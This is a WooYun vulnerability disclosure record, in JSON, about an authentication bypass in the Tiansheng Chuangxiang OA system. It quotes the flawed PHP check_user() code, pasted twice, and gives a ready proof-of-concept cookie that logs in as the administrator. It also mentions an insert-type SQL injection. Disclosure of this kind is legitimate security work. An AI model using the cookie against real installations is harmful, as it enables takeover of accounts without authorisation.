{"id": 5951, "wybug_id": "wooyun-2013-043578", "wybug_title": "天生创想oa任意用户登陆包括管理员", "wybug_corp": "天生创想", "wybug_author": "句子", "wybug_date": "2013-11-21 12:48", "wybug_open_date": "2014-02-19 12:49", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-02-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 天生创想oa任意用户登陆,包括管理员，附加一枚注入 详细说明：  \nfunction check_user() { \t\tif ( !$auth = get_cookie('auth') ) return false;\t\tlist($uid, $password ) = explode(\"\\t\", authcode($auth, 'DECODE'));\t\t#echo 'uid='.$uid.\"||password=\".$password;\t\tif (is_numeric($uid)){\t\t\t$sql = \"SELECT * FROM \".DB_TABLEPRE.\"session WHERE uid = '$uid' AND password = '\".addslashes($password).\"'\";\t\t\t#echo $sql;\t\t\tif ( $result = $this->db->fetch_one_array($sql) ) { \t\t\t\t$this->id = $result['uid'];\t\t\t\t$this->name = addslashes($result['username']);\t\t\t\t$this->groupid = $result['groupid'];\t\t\t}else { \t\t\t\t$sql = \"SELECT id AS uid,username,password,groupid,userkey FROM \".DB_TABLEPRE.\"user WHERE ischeck = 1 AND id = '$uid'\";\t\t\t\t\t\t\t\tif ( $result = $this->db->fetch_one_array($sql) ) {\t\t\t\t\t$this->id = $result['uid'];\t\t\t\t\t$this->name = addslashes($result['username']);\t\t\t\t\t$this->groupid = $result['groupid'];\t\t\t\t\t$result['password'] = $password;\t\t\t\t\tunset($result['userkey']);\t\t\t\t\t$this->add_session($result);\t\t\t\t}\t\t\t}\t\t}\t\tif (!$this->id ) {\t\t\t$this->logout();\t\t}\t\tfunction check_user() { \t\tif ( !$auth = get_cookie('auth') ) return false;\t\tlist($uid, $password ) = explode(\"\\t\", authcode($auth, 'DECODE'));\t\t#echo 'uid='.$uid.\"||password=\".$password;\t\tif (is_numeric($uid)){\t\t\t$sql = \"SELECT * FROM \".DB_TABLEPRE.\"session WHERE uid = '$uid' AND password = '\".addslashes($password).\"'\";\t\t\t#echo $sql;\t\t\tif ( $result = $this->db->fetch_one_array($sql) ) { \t\t\t\t$this->id = $result['uid'];\t\t\t\t$this->name = addslashes($result['username']);\t\t\t\t$this->groupid = $result['groupid'];\t\t\t}else { \t\t\t\t$sql = \"SELECT id AS uid,username,password,groupid,userkey FROM \".DB_TABLEPRE.\"user WHERE ischeck = 1 AND id = '$uid'\";\t\t\t\t\t\t\t\tif ( $result = $this->db->fetch_one_array($sql) ) {\t\t\t\t\t$this->id = $result['uid'];\t\t\t\t\t$this->name = addslashes($result['username']);\t\t\t\t\t$this->groupid = $result['groupid'];\t\t\t\t\t$result['password'] = $password;\t\t\t\t\tunset($result['userkey']);\t\t\t\t\t$this->add_session($result);\t\t\t\t}\t\t\t}\t\t}\t\tif (!$this->id ) {\t\t\t$this->logout();\t\t}\t\t\t}\t}\n流程上，查询失败时，更新外部输入的密码，插入数据库中，保存的会话表内流程访问：http://127.0.0.1/home.php添加cookie：toa_auth=MQkzMzMzMzM=成功登陆至设备。同事，$password 是base64解码输入，未作过滤，存在insert型的sql注入   漏洞证明：  \n\n流程访问：http://127.0.0.1/home.php添加cookie：toa_auth=MQkzMzMzMzM=再次访问，就进入系统了   修复方案：  奇葩的逻辑，修复你们自己懂的   版权声明：转载请注明来源 句子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-02-19 15:58 |    \t\tMoyo \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 神经病一枚)\t\t \n  最近源码分析的开始多起来了    \n     2014-02-19 15:59 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  yeah？这货原来是PHP的，记错了呢    \n     2014-02-19 16:21 |    \t\t句子 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:6        | ...)\t\t \n  就这样忽略了，╮(╯▽╰)╭    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}